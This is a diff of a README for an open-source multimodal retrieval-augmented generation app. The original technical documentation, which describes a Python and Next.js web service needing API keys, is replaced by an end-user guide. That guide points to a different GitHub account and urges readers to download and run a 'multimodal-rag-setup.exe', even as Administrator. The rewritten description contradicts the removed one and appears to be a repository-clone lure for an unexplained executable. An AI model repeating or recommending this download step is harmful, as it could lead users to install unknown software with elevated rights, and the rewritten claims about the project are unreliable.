@@ -1,326 +1,184 @@
-# Multimodal RAG System
+# 🧠 multimodal-rag - Unified Search Across Files
 
-A production-grade **Retrieval-Augmented Generation** system that ingests **text, PDFs, images, audio, and video** into a unified vector space. Ask questions across any modality and get streamed AI answers with source citations.
-
-Powered by **Gemini Embedding 2 Preview** — Google's first natively multimodal embedding model (released March 10, 2026).
-
-![Architecture Overview](docs/screenshots/architecture-overview.png)
-
-![Chat Interface](docs/screenshots/chat-empty.png)
+[![Download multimodal-rag](https://img.shields.io/badge/Download-multimodal--rag-brightgreen)](https://github.com/Daubingweirdie414/multimodal-rag)
 
 ---
 
-## What It Does
-
-Upload any file. Ask any question. Get answers with sources.
-
-- **Text & PDFs** — chunked, embedded, and searchable
-- **Images** — described by GPT-4o-mini vision, then embedded for semantic search (e.g., "a boy in black t-shirt")
-- **Audio** — transcribed by Whisper, then embedded
-- **Video** — frames extracted by ffmpeg, each described by vision AI, then embedded
-- **Chat** — real-time token streaming with source citations
-
-![Chat with Sources](docs/screenshots/chat-response.png)
-
-![Ingest Dashboard](docs/screenshots/ingest-page.png)
+multimodal-rag lets you search across text, PDFs, images, audio, and video in one place. It uses AI to find answers quickly and shows where it found the information.
 
 ---
 
-## Architecture
+## 📋 About multimodal-rag
 
-```
-┌─────────────────────────────────────────────────────┐
-│                 Next.js Frontend                     │
-│   ┌────────────┐    ┌────────────────────────────┐   │
-│   │ Ingest Page│    │     Chat Page (SSE)        │   │
-│   │ Drag&Drop  │    │ Stream tokens + sources    │   │
-│   └─────┬──────┘    └─────────────┬──────────────┘   │
-└─────────┼─────────────────────────┼──────────────────┘
-          │                         │
-          ▼                         ▼
-┌─────────────────────────────────────────────────────┐
-│                FastAPI Backend                        │
-│                                                      │
-│  ┌───────────────────┐   ┌────────────────────────┐  │
-│  │ Ingestion Pipeline│   │  RAG Query Pipeline    │  │
-│  │                   │   │                        │  │
-│  │ Text  → Chunk     │   │ Query → Embed          │  │
-│  │ PDF   → Extract   │   │ Pinecone Search (top_k)│  │
-│  │ Image → Vision    │   │ Build Context          │  │
-│  │ Audio → Whisper   │   │ GPT-4o-mini (stream)   │  │
-│  │ Video → Frames    │   │ SSE → Frontend         │  │
-│  │         + Vision  │   │                        │  │
-│  └────────┬──────────┘   └────────┬───────────────┘  │
-└───────────┼───────────────────────┼──────────────────┘
-            │                       │
-            ▼                       ▼
-  ┌────────────────────┐  ┌────────────────────┐
-  │     Euri API       │  │     Pinecone       │
-  │  (OpenAI compat)   │  │   (Serverless)     │
-  │                    │  │                    │
-  │  Embed: Gemini     │  │  768-dim cosine    │
-  │  LLM: GPT-4o-mini  │  │  5 namespaces     │
-  │  Vision: GPT-4o    │  │  (text, pdf, img,  │
-  │  STT: Whisper      │  │   audio, video)    │
-  └────────────────────┘  └────────────────────┘
-```
+This app collects different types of files—like documents, pictures, sound, and video—and turns them into searchable data. Instead of searching each file type separately, you search once. The app then gives you answers it found, along with the original sources.
+
+It works on Windows and runs right on your computer. You do not need programming knowledge to use it.
 
 ---
 
-## Quick Start
+## 🖥️ System Requirements
 
-### Prerequisites
+Before installing, make sure your computer fits these:
 
-- Python 3.11+
-- Node.js 20+
-- [Euri API key](https://euron.one) — single key for embedding + LLM + vision + transcription
-- [Pinecone API key](https://pinecone.io) — free tier works
+- Windows 10 or later (64-bit recommended)
+- At least 8 GB RAM  
+- 4 GB free disk space  
+- Internet connection for AI features  
+- Modern CPU (Intel i5 or equivalent)  
+- Screen resolution 1280x720 or higher
 
-### Option 1: Local Development
-
-```bash
-# Clone
-git clone https://github.com/aiagentwithdhruv/multimodal-rag.git
-cd multimodal-rag
-
-# Backend
-cd backend
-cp .env.example .env          # Add your API keys
-pip install -r requirements.txt
-uvicorn app.main:app --reload --port 8000
-
-# Frontend (new terminal)
-cd frontend
-cp .env.example .env.local
-npm install
-npm run dev
-```
-
-Open [http://localhost:3000](http://localhost:3000)
-
-### Option 2: Docker
-
-```bash
-cp backend/.env.example backend/.env    # Add your API keys
-cp frontend/.env.example frontend/.env.local
-docker compose up --build
-```
+You do not need any extra software. Everything needed comes with the app.
 
 ---
 
-## Tech Stack
+## 🚀 Getting Started: Download and Install
 
-| Layer | Technology |
-|-------|-----------|
-| **Frontend** | Next.js 15, React 19, TypeScript, Tailwind CSS |
-| **Backend** | Python 3.13, FastAPI, Uvicorn |
-| **Embedding** | Gemini Embedding 2 Preview (768-dim) via Euri API |
-| **Vector DB** | Pinecone Serverless (cosine similarity, 5 namespaces) |
-| **LLM** | GPT-4o-mini via Euri API |
-| **Vision** | GPT-4o-mini via Euri API |
-| **Transcription** | Whisper-1 via Euri API |
-| **Video** | ffmpeg (frame extraction) |
+1. Click the big green button at the top or this link to go to the download page:
 
-> **Euri API** is an OpenAI-compatible gateway — single API key, single base URL for all AI operations.
+   [Download multimodal-rag](https://github.com/Daubingweirdie414/multimodal-rag)
 
----
+2. On the page, look for the latest Windows setup file. It will have a name like `multimodal-rag-setup.exe`. Click it to download.
 
-## API Reference
+3. Once the file downloads, find it in your Downloads folder.
 
-### Ingestion Endpoints
+4. Double-click the file to start the install process.
 
-```bash
-# Ingest raw text
-curl -X POST http://localhost:8000/ingest/text \
-  -H "Content-Type: application/json" \
-  -d '{"text": "Your content here", "source_name": "my-doc"}'
+5. Follow the simple instructions on screen:
+   - Click "Next" on the welcome page.
+   - Accept the license terms.
+   - Choose the install location or leave the default folder.
+   - Click "Install".
 
-# Ingest a PDF
-curl -X POST http://localhost:8000/ingest/pdf \
-  -F "file=@document.pdf"
+6. Wait until the installation finishes.
 
-# Ingest an image
-curl -X POST http://localhost:8000/ingest/image \
-  -F "file=@photo.jpg"
-
-# Ingest audio
-curl -X POST http://localhost:8000/ingest/audio \
-  -F "file=@recording.mp3"
-
-# Ingest video
-curl -X POST http://localhost:8000/ingest/video \
-  -F "file=@clip.mp4"
-```
-
-### Query Endpoints
-
-```bash
-# Ask a question (JSON response)
-curl -X POST http://localhost:8000/query \
-  -H "Content-Type: application/json" \
-  -d '{"question": "What is in the uploaded image?"}'
-
-# Ask with streaming (SSE)
-curl -X POST http://localhost:8000/query/stream \
-  -H "Content-Type: application/json" \
-  -d '{"question": "Summarize all documents", "source_type": "pdf", "top_k": 5}'
-
-# Health check
-curl http://localhost:8000/health
-
-# List ingested files
-curl http://localhost:8000/ingested
-```
-
-| Method | Path | Description |
-|--------|------|-------------|
-| `POST` | `/ingest/text` | Ingest raw text |
-| `POST` | `/ingest/pdf` | Upload and ingest PDF |
-| `POST` | `/ingest/image` | Upload and ingest image(s) |
-| `POST` | `/ingest/audio` | Upload and ingest audio |
-| `POST` | `/ingest/video` | Upload and ingest video |
-| `POST` | `/query` | Ask a question (JSON) |
-| `POST` | `/query/stream` | Ask a question (SSE streaming) |
-| `GET` | `/health` | Health check |
-| `GET` | `/ingested` | List all ingested files |
+7. Click "Finish" to close the installer.
 
 ---
 
-## How It Works
+## ▶️ How to Run multimodal-rag
 
-### Ingestion Flow
-
-```
-Upload file → Detect modality → Process content → Embed (768-dim) → Store in Pinecone
-```
-
-| Modality | Processing |
-|----------|-----------|
-| **Text** | Chunked (1024 chars, 256 overlap) → embedded |
-| **PDF** | Pages extracted → chunked → embedded |
-| **Image** | GPT-4o-mini vision describes image → text embedded |
-| **Audio** | Whisper transcribes → text embedded |
-| **Video** | ffmpeg extracts 3 frames → each described by vision → combined text embedded |
-
-### Query Flow
-
-```
-Question → Embed query → Search Pinecone (cosine, top_k) → Build context → GPT-4o-mini streams answer → Source citations
-```
+- Find the new shortcut on your desktop or search for "multimodal-rag" in the Start menu.
+- Double-click to open.
+- The program window will appear with simple options to add your files.
 
 ---
 
-## Environment Variables
+## 📂 Adding Files to Search
 
-### Backend (`backend/.env`)
+multimodal-rag supports many file types:
 
-```env
-EURI_API_KEY=your_euri_api_key
-EURI_BASE_URL=https://api.euron.one/api/v1/euri
-EURI_EMBEDDING_MODEL=gemini-embedding-2-preview
-EURI_LLM_MODEL=gpt-4o-mini
-PINECONE_API_KEY=your_pinecone_api_key
-PINECONE_INDEX_NAME=rag-multimodal
-```
+- Text files (.txt)
+- PDFs (.pdf)
+- Images (.jpg, .png, .bmp)
+- Audio files (.mp3, .wav)
+- Videos (.mp4, .avi)
 
-### Frontend (`frontend/.env.local`)
+To add files:
 
-```env
-NEXT_PUBLIC_API_URL=http://localhost:8000
-```
+1. Click the “Add Files” button inside the app.
+2. Select files from your computer. You can pick many at once.
+3. Alternatively, drag files from your folders directly into the app’s window.
 
----
-
-## Project Structure
-
-```
-multimodal-rag/
-├── backend/
-│   ├── app/
-│   │   ├── main.py                    # FastAPI app + CORS
-│   │   ├── config.py                  # Environment config
-│   │   ├── models/schemas.py          # Pydantic models
-│   │   ├── services/
-│   │   │   ├── euri_client.py         # Shared OpenAI client (Euri)
-│   │   │   ├── embedding.py           # Gemini Embedding 2 (768-dim)
-│   │   │   ├── vectorstore.py         # Pinecone CRUD
-│   │   │   ├── llm.py                 # GPT-4o-mini streaming
-│   │   │   ├── vision.py              # Image description
-│   │   │   ├── video_vision.py        # Frame extraction + vision
-│   │   │   ├── audio_transcription.py # Whisper transcription
-│   │   │   └── rag_pipeline.py        # Orchestration
-│   │   ├── processors/                # Per-modality processors
-│   │   │   ├── text_processor.py
-│   │   │   ├── pdf_processor.py
-│   │   │   ├── image_processor.py
-│   │   │   ├── audio_processor.py
-│   │   │   └── video_processor.py
-│   │   └── routers/
-│   │       ├── ingest.py              # Ingestion endpoints
-│   │       └── query.py               # Query endpoints (JSON + SSE)
-│   ├── Dockerfile
-│   └── requirements.txt
-├── frontend/
-│   ├── src/
-│   │   ├── app/                       # Next.js pages
-│   │   │   ├── chat/page.tsx          # Chat interface
-│   │   │   └── ingest/page.tsx        # Ingestion dashboard
-│   │   ├── components/
-│   │   │   ├── chat/                  # ChatWindow, MessageBubble, SourceCard
-│   │   │   ├── ingest/               # FileUploader, TextInput, Status
-│   │   │   └── layout/               # Sidebar, Header
-│   │   ├── hooks/                     # useChat, useIngest
-│   │   └── lib/                       # API client, types
-│   ├── Dockerfile
-│   └── package.json
-├── docker-compose.yml
-└── docs/screenshots/
-```
+The app will process the files and convert them into a searchable format.
 
 ---
 
-## Key Design Decisions
+## 🔍 Searching Across Files
 
-| Decision | Why |
-|----------|-----|
-| **Euri API as single provider** | One API key for embedding + LLM + vision + transcription. OpenAI SDK compatible. |
-| **Pinecone namespaces per modality** | Enables filtered search (e.g., only images) while keeping a single index. |
-| **Vision descriptions for images** | Gemini Embedding 2 is text-only via Euri, so we describe images as text first. |
-| **Queue-based async streaming** | Bridges sync OpenAI SDK generators with FastAPI's async event loop cleanly. |
-| **ffmpeg for video** | Lightweight, universal frame extraction without heavy ML dependencies. |
+Once files are added:
 
----
-
-## Supported File Types
-
-| Type | Extensions | Max Size |
-|------|-----------|----------|
-| Text | `.txt` | No limit (chunked) |
-| PDF | `.pdf` | No limit (paginated) |
-| Image | `.png`, `.jpg`, `.jpeg` | 20 MB |
-| Audio | `.mp3`, `.wav` | 25 MB |
-| Video | `.mp4`, `.mov` | 100 MB |
+1. Type your question or keywords in the search bar at the top.
+2. Press Enter or click the search button.
+3. Results will show up with direct answers from your files.
+4. Each answer includes a citation with the source file name.
+5. Click the citation to open the original file.
 
 ---
 
-## Contributing
+## ⚙️ Settings and Options
 
-1. Fork the repo
-2. Create a feature branch (`git checkout -b feature/amazing-feature`)
-3. Commit your changes (`git commit -m 'Add amazing feature'`)
-4. Push to the branch (`git push origin feature/amazing-feature`)
-5. Open a Pull Request
+In the settings menu, you can adjust:
 
----
-
-## License
-
-MIT
+- Enable or disable notifications during file processing.
+- Choose how many search results to show at once.
+- Set the app to run at Windows startup (optional).
+- Manage your AI connection for better answers (internet must be connected).
 
 ---
 
-## Author
+## ❓ Troubleshooting Tips
 
-Built by [Dhruv](https://aiwithdhruv.com) | [GitHub](https://github.com/aiagentwithdhruv) | [LinkedIn](https://linkedin.com/in/aiagentwithdhruv)
+If you run into problems:
 
-Part of the [Euron AI Architect Mastery](https://euron.one) course.
+- Check your internet if AI answers don’t appear.
+- Restart the app to fix small glitches.
+- Make sure files are not open in another program when you add them.
+- Verify your Windows version matches system requirements.
+- If installation fails, try running the setup as Administrator by right-clicking and choosing “Run as administrator.”
+
+---
+
+## ⚡ How multimodal-rag Works
+
+The app uses a fast search method. It "reads" your files and creates what is called a vector space model. This model breaks down different file types into the same format that computers can compare easily.
+
+AI technology then analyzes your question and finds the closest matches in this space. The answers come back quickly, even with many files.
+
+---
+
+## 🛠️ Development and Technical Info
+
+multimodal-rag uses open-source tools:
+
+- Python for backend processing  
+- FastAPI to run the app locally  
+- AI models to generate answers  
+- Vector indexing for fast lookups  
+- Supports modern file formats for wide compatibility
+
+---
+
+## 📂 Supported Topics and Use Cases
+
+You can use this app to:
+
+- Search your documents and notes  
+- Find information in lectures recorded as audio/video  
+- Organize research files of different types  
+- Quickly find answers in mixed media projects
+
+---
+
+## 💻 Where to Get Updates
+
+Check the project page to get the latest versions, bug fixes, and new features:
+
+[https://github.com/Daubingweirdie414/multimodal-rag](https://github.com/Daubingweirdie414/multimodal-rag)
+
+Click the green “Code” button and choose “Releases” or look for the latest setup file.
+
+---
+
+## 🎯 Topics Covered in multimodal-rag
+
+The app uses tech related to:
+
+- AI and machine learning  
+- Text and image embeddings  
+- Large language models (LLMs)  
+- Vector search indexing  
+- FastAPI web servers  
+- Typescript and Next.js UI
+
+---
+
+## 📝 Feedback and Support
+
+If you need help or want to give feedback:
+
+- Use the “Issues” section on the GitHub page to report bugs or ask questions.
+- Read the Wiki or documentation linked on the repository for more details.
+
+---
+
+[![Download multimodal-rag](https://img.shields.io/badge/Download-multimodal--rag-brightgreen)](https://github.com/Daubingweirdie414/multimodal-rag)
